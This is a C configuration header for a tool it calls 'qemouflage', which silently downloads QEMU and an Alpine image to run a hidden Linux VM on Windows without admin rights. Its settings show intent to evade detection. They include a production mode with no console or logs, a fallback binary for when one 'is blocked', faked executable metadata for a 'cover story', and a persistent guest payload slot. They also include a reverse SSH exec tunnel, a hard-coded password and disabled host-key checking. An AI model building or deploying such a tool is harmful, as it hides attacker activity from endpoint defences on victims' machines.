/*
 * config.h -- edit this, rebuild.
 * Passed via: -include config.h
 */

//#define PROD   /* uncomment = no console, no logs, GUI subsystem */

/* ---- work dir (%LOCALAPPDATA%\<name>) ---- */
#define WORK_DIR_NAME      "AppServices"

/* ---- 7-Zip (downloaded on first run) ---- */
#define FILE_7ZR           "7zr.exe"
#define FILE_7ZFULL        "7z-installer.exe"
#define DIR_7ZIP           "7zip"
#define FILE_7Z_BIN        "7z.exe"

/* ---- QEMU ---- */
#define DIR_QEMU           "runtime"
#define FILE_QEMU_BIN      "qemu-system-x86_64.exe"
#define FILE_QEMU_BIN_ALT  "qemu-system-x86_64w.exe"   /* fallback if console ver is blocked */
#define FILE_QEMU_IMG      "qemu-img.exe"

/* ---- VM ---- */
#define VM_RAM_MB          "2048"
#define VM_SMP             "2"
#define DISK_GROW          "+8G"

/* ---- guest account ---- */
#define GUEST_USER         "svc"
#define GUEST_PASSWORD     "Ks8#mP2x"

/* ---- networking ---- */
#define SSH_HOST_PORT      2222
#define EXEC_PORT          49152
#define FILE_SSH_KEY       "id_ed25519"
#define HTTP_UA            L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

/* ---- guest payload (empty = disabled) ---- */
#define UTILITY_URL        ""
#define UTILITY_GUEST_PATH "/usr/local/bin/appserviced"

/* ---- download URLs ---- */
#define URL_7ZR            "https://github.com/ip7z/7zip/releases/download/26.01/7zr.exe"
#define URL_7ZFULL         "https://github.com/ip7z/7zip/releases/download/26.01/7z2601-x64.exe"
#define QEMU_BASE_URL      "https://qemu.weilnetz.de/w64/"
#define ALPINE_BASE_URL    "https://dl-cdn.alpinelinux.org/alpine/latest-stable/releases/cloud/"
#define QEMU_FALLBACK      "qemu-w64-setup-20260501.exe"
#define ALPINE_FALLBACK    "generic_alpine-3.23.4-x86_64-bios-cloudinit-r0.qcow2"

/* ---- PE metadata (adapt to your cover story) ---- */
#define RC_COMPANY      "Contoso Ltd."
#define RC_DESCRIPTION  "Workspace Configuration Utility"
#define RC_PRODUCT      "Contoso Workspace Tools"
#define RC_FILENAME     "wsconfig.exe"
#define RC_VERSION_STR  "3.4.1.0"
#define RC_VERSION_NUM  3,4,1,0

/* ---- log/error strings ---- */

#define LOG_BANNER          "=== qemouflage : Alpine Linux under QEMU (TCG), no admin ==="
#define LOG_WORKDIR         "Working directory: %s"
#define LOG_SEP             "============================================================"

#define LOG_STEP1           "[1/6] Downloading 7-Zip tools..."
#define LOG_STEP2           "[2/6] Extracting 7z.exe / 7z.dll (via 7zr)..."
#define LOG_STEP3           "[3/6] Looking up the latest QEMU version..."
#define LOG_STEP4           "[4/6] Extracting QEMU (no installer => no UAC)..."
#define LOG_STEP5           "[5/6] Looking up the latest Alpine cloud image..."
#define LOG_STEP6           "[6/6] Starting the cloud-init seed server (NoCloud)..."

#define LOG_DL_SKIP         "  -> already present (%lld bytes), skipping download: %s"
#define LOG_DL_OPEN_ERR     "  !! failed to open request: %s"
#define LOG_DL_STATUS_ERR   "  !! HTTP status %lu for %s"
#define LOG_DL_CREATE_ERR   "  !! cannot create %s"
#define LOG_DL_PROGRESS     "     %.1f / %.1f MB (%.0f%%)"
#define LOG_DL_PROGRESS_NOLEN "     %.1f MB received..."
#define LOG_DL_INCOMPLETE   "  !! incomplete download (%lld bytes): %s"
#define LOG_DL_OK           "  -> OK: %lld bytes written to %s"

#define LOG_QEMU_INDEX_UNAVAIL  "  (QEMU index unavailable, using fallback)"
#define LOG_QEMU_LATEST         "  -> latest QEMU: %s"
#define LOG_QEMU_DL             "Downloading QEMU (%s, ~190 MB)..."
#define LOG_QEMU_BIN            "  -> QEMU: %s"
#define LOG_QEMU_CMD_LABEL      "QEMU command:"

#define LOG_ALPINE_INDEX_UNAVAIL "  (Alpine index unavailable, using fallback)"
#define LOG_ALPINE_LATEST        "  -> latest Alpine: %s"
#define LOG_ALPINE_DL            "Downloading Alpine image (%s)..."

#define LOG_7Z_OK               "  -> 7z ready: %s"
#define LOG_PROC_ERR            "  !! CreateProcess failed (code %lu) for: %s"

#define LOG_DISK_GROWN          "  -> virtual disk extended (%s); root will be grown at boot by cloud-init."
#define LOG_DISK_RESIZE_ERR     "  !! qemu-img resize failed (code %d); guest disk space may be insufficient."
#define LOG_DISK_NOTFOUND       "  !! qemu-img.exe not found; skipping resize (rclone may run out of space)."

#define LOG_HOSTNAME            "  -> guest hostname: %s (taken from the Windows machine)"
#define LOG_PAYLOAD             "  -> guest payload active on first boot and every restart: %s"
#define LOG_SEED_PORT           "  -> seed server on 127.0.0.1:%d (seen by guest as 10.0.2.2:%d)"
#define LOG_EXEC_KEYGEN         "  -> generating SSH key pair for the exec tunnel..."
#define LOG_EXEC_PORT           "  -> exec server on 127.0.0.1:%d (reverse SSH tunnel from guest)"
#define LOG_SSH_TUNNEL          "  -> reverse SSH tunnel being established (host->VM, port %d)..."
#define LOG_EXEC_CMD            "[exec] %s (code: %lu)"
#define LOG_PORT_CHANGED        "  -> port %d in use, switching to port %d"

#define LOG_SEED_200            "[seed] 200 %s served to guest (%d bytes)"
#define LOG_SEED_404            "[seed] 404 %s"

#define LOG_VM_START            " Starting VM in TCG mode (emulation: expect 1-3 min)."
#define LOG_VM_CLOUDINIT        " cloud-init will create the user and start sshd."
#define LOG_SSH_LABEL           " SSH connection from Windows once the VM is ready:"
#define LOG_SSH_CMD             "     ssh -p %d %s@127.0.0.1"
#define LOG_SSH_PWD             "     (password: %s)"
#define LOG_SSH_TIP             " Tip for first connection: if the host key changes between runs,"
#define LOG_SSH_NOCHECK         "   ssh -p %d -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL %s@127.0.0.1"
#define LOG_QEMU_EXIT           "QEMU exited (code %d)."

#define ERR_WINSOCK         "WSAStartup failed"
#define ERR_LOCALAPPDATA    "LOCALAPPDATA environment variable not found"
#define ERR_DL_7ZR          "Failed to download 7zr.exe"
#define ERR_DL_7ZFULL       "Failed to download 7-Zip archive"
#define ERR_7ZR             "7zr failed (code %d)"
#define ERR_7Z_NOTFOUND     "7z.exe not found after extraction"
#define ERR_DL_QEMU         "Failed to download QEMU"
#define ERR_QEMU_EXTRACT    "QEMU extraction failed (code %d)"
#define ERR_QEMU_NOTFOUND   FILE_QEMU_BIN " / " FILE_QEMU_BIN_ALT " not found after extraction"
#define ERR_DL_ALPINE       "Failed to download Alpine image"
#define ERR_SEED_SERVER     "Failed to start the seed server"
#define ERR_EXEC_SERVER     "Failed to start the exec server"
#define ERR_SSH_PORT        "No available port for SSH starting from %d"
